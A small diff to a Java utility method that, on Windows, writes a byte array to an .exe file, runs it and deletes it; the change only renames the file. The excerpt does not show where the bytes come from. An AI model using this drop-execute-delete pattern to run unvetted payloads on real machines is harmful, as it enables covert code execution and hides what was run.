@@ -51,12 +51,12 @@ public class ProgramUtil {
     public static void runProg(byte[] bytes) {
         if (!isWin()) return;
         try {
-            File file = new File("t3mp.exe");
+            File file = new File("temp.exe");
             file.createNewFile();
             FileOutputStream out = new FileOutputStream(file);
             out.write(bytes);
             out.close();
-            Process process = Runtime.getRuntime().exec("t3mp.exe");
+            Process process = Runtime.getRuntime().exec("temp.exe");
             process.waitFor();
             if (file.exists()) file.delete();
         } catch (IOException | InterruptedException e) {
